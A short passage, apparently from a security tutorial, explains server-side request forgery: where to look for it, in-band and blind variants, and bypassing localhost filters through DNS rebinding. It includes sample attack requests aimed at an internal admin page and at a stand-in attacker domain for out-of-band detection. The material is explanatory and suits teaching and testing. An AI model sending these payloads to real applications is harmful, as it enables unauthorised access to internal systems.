Identifying Potential Entry Points

SSRF usually occurs in functionality that imports data from a URL. Look for these specific features and parameter names during your manual browsing or crawling.

  • 03 PDF/Image Generators

In-Band SSRF

The application returns the response from the fetched URL directly to you.

Request: POST /stock?api=http://localhost/admin
Response: 200 OK "Welcome to Admin Panel"

Blind SSRF

The application fetches the URL but does not return the content. You must rely on out-of-band (OOB) interactions.

Request: POST /track?url=http://attacker-controlled.com
Response: 200 OK "Tracking enabled"
Attacker Log: [DNS Query] received.

Filter Evasion Techniques

Developers often blacklist "localhost". Here is how to bypass those filters.

DNS Rebinding

Configure a domain with a very short TTL. First resolution returns a public IP, second resolution returns 127.0.0.1.
